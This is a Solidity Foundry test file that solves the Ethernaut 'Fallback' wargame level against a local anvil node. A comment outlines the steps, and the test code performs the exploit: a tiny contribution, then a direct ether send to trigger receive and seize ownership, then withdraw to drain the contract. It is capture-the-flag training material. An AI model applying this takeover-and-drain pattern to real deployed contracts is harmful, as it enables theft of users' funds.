// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "../src/01_Fallback.sol";
import "forge-std/Test.sol";


/*
Author: @BoscoHuang

Attack Process:
- Invoke `contribute`  function, send `msg.value < 0.001 ether`
- Then, send `msg.value > 0` to the contract directly
- Trigger `receive`, and become the owner
- At last, invoke `withdraw` function to drain all the ether.

Command:
- forge test --match-contract FallbackTest --fork-url http://127.0.0.1:8545 -vvv
*/

contract FallbackTest is DSTest{
    Fallback Ethernaut01;

    function setUp() public {
        Ethernaut01 = Fallback(payable(0x5FbDB2315678afecb367f032d93F642f64180aa3)); // Fallback address in anvil

    }

    function testEthernaut01() public {
        console.log("Ethernaut01 owner:", Ethernaut01.owner()); // Owner is the contract deployer
        
        Ethernaut01.contribute{value: 1 wei}();
        Ethernaut01.getContribution();

        (bool success, ) = address(Ethernaut01).call{value: 1 wei}("");
        require(success, "Call failed");

        assert(address(this) == Ethernaut01.owner()); // Attacker become the owner
        Ethernaut01.withdraw();
    }

    receive() external payable {}
}
